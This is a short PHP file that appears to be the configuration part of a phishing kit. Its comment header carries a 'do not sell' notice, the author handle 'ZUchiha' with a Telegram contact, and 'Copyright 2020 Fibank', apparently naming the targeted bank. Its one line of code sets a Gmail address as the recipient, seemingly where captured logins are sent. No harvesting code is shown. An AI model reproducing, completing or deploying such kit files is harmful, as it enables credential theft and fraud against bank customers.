<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * version 2.0
 * icq & telegram = @Fiddlerl
 
###############################################
#$            C0d3d by ZUchiha               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Fibank            $#
###############################################

**/


 
$to="zackairbnb2050@gmail.com" ; 


?>